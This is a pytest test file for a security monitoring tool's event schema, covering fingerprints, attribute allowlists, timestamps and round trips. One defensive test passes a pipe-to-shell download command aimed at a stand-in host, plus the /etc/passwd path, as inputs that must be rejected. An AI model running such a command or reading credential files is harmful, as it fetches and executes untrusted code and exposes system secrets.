import json
from datetime import UTC, datetime

import pytest
from hypothesis import given
from hypothesis import strategies as st
from pydantic import ValidationError

from refmon.schemas import EVENT_ATTR_KEYS, Event, EventType

FP = "hmac:" + "9c1e5a7d40b2f813" * 4


def make(**overrides) -> dict:
    """The C2 example event, with the elided fingerprint filled in."""
    event = {
        "event_id": "e-000184",
        "ts": "2026-10-28T10:02:15.120Z",
        "device": "dev-7f3a",
        "type": "exec",
        "actor": {
            "id": "p-1842",
            "parent": "p-77",
            "role": "web_worker",
            "interactive": False,
            "user": "svc-www",
        },
        "object": {"class": "command_text", "fingerprint": FP},
        "attrs": {"source_class": "inbound_request"},
    }
    event.update(overrides)
    return event


def test_c2_example_validates():
    event = Event.model_validate(make())
    assert event.type is EventType.EXEC
    assert event.object.class_ == "command_text"
    assert event.ts == datetime(2026, 10, 28, 10, 2, 15, 120000, tzinfo=UTC)


def test_json_line_round_trip_uses_class_alias():
    event = Event.model_validate(make())
    line = event.to_json_line()
    assert json.loads(line)["object"]["class"] == "command_text"
    assert Event.from_json_line(line) == event


def test_parent_and_fingerprint_are_optional():
    data = make(object={"class": "priv_level"})
    data["actor"] = {"id": "p-1", "role": "system_service", "interactive": False, "user": "root"}
    event = Event.model_validate(data)
    assert event.actor.parent is None
    assert event.object.fingerprint is None


def test_timestamp_is_normalised_to_utc():
    event = Event.model_validate(make(ts="2026-10-28T12:02:15.120+02:00"))
    assert event.ts == datetime(2026, 10, 28, 10, 2, 15, 120000, tzinfo=UTC)
    assert event.ts.utcoffset().total_seconds() == 0


@pytest.mark.parametrize(
    "bad",
    [
        {"ts": "2026-10-28T10:02:15.120"},  # naive timestamp
        {"type": "teleport"},  # unknown event type
        {"attrs": {"source_class": "carrier_pigeon"}},  # unknown source class
        {"object": {"class": "command_text", "fingerprint": "hmac:xyz"}},  # not hex
        {"object": {"class": "command_text", "fingerprint": "sha256:" + "a" * 64}},  # wrong scheme
        {"object": {"class": "command_text", "fingerprint": "hmac:ab"}},  # too short
        {"extra_field": 1},  # unknown top-level key
    ],
)
def test_invalid_events_are_rejected(bad):
    with pytest.raises(ValidationError):
        Event.model_validate(make(**bad))


def test_raw_content_cannot_ride_along_in_attrs():
    for raw in ("curl http://example.invalid/x | sh", "/etc/passwd", "a" * 65):
        with pytest.raises(ValidationError):
            Event.model_validate(make(attrs={"note": raw}))


def test_raw_content_cannot_replace_a_fingerprint():
    with pytest.raises(ValidationError):
        Event.model_validate(make(object={"class": "command_text", "fingerprint": "echo hello"}))


def test_unknown_role_is_rejected_unless_policy_adds_it():
    data = make()
    data["actor"]["role"] = "build_agent"
    with pytest.raises(ValidationError):
        Event.model_validate(data)
    event = Event.model_validate(data, context={"extra_roles": ["build_agent"]})
    assert event.actor.role == "build_agent"


@pytest.mark.parametrize("key", ["domain", "host", "ip", "url", "url_path", "note", "path"])
def test_attribute_keys_not_on_the_allowlist_are_rejected(key):
    with pytest.raises(ValidationError, match="allowlist"):
        Event.model_validate(make(attrs={key: "x"}))


def test_every_allowlisted_key_is_accepted():
    attrs = {key: True for key in EVENT_ATTR_KEYS - {"source_class"}}
    assert Event.model_validate(make(attrs=attrs)).attrs == attrs


@pytest.mark.parametrize("value", [True, False, "unknown"])
def test_signed_is_three_valued(value):
    event = Event.model_validate(make(attrs={"signed": value}))
    assert event.attrs["signed"] == value
    assert Event.from_json_line(event.to_json_line()) == event


@pytest.mark.parametrize("value", ["maybe", "true", "false", 1, 0, "Unknown"])
def test_signed_rejects_anything_else_and_never_coerces_unknown(value):
    with pytest.raises(ValidationError, match="signed"):
        Event.model_validate(make(attrs={"signed": value}))


def test_unknown_stays_unknown_and_is_not_false():
    event = Event.model_validate(make(attrs={"signed": "unknown"}))
    assert event.attrs["signed"] != False  # noqa: E712 - the point is that it is not False
    assert event.attrs["signed"] == "unknown"


def test_attribute_values_for_trusted_source_and_destination_class():
    ok = Event.model_validate(
        make(attrs={"trusted_source": "official-python-index", "destination_class": "unknown"})
    )
    assert ok.attrs["destination_class"] == "unknown"


@pytest.mark.parametrize("type_", ["request_end", "response_out"])
def test_request_end_and_response_out_are_event_types(type_):
    event = Event.model_validate(make(type=type_, attrs={"bytes": 4096}))
    assert event.type is EventType(type_)


def test_events_are_immutable():
    event = Event.model_validate(make())
    with pytest.raises(ValidationError):
        event.device = "dev-other"


identifiers = st.from_regex(r"[A-Za-z0-9_.:@-]{1,64}", fullmatch=True)
attr_keys = st.sampled_from(
    sorted(EVENT_ATTR_KEYS - {"source_class", "signed"})
)  # fixed-value keys have their own tests


@given(
    attrs=st.dictionaries(
        attr_keys,
        st.one_of(
            st.booleans(),
            st.integers(),
            st.floats(allow_nan=False, allow_infinity=False),
            identifiers,
        ),
        max_size=6,
    ),
    fingerprint=st.from_regex(r"hmac:[0-9a-f]{16,64}", fullmatch=True),
)
def test_round_trip_property(attrs, fingerprint):
    event = Event.model_validate(
        make(attrs=attrs, object={"class": "x", "fingerprint": fingerprint})
    )
    assert Event.from_json_line(event.to_json_line()) == event
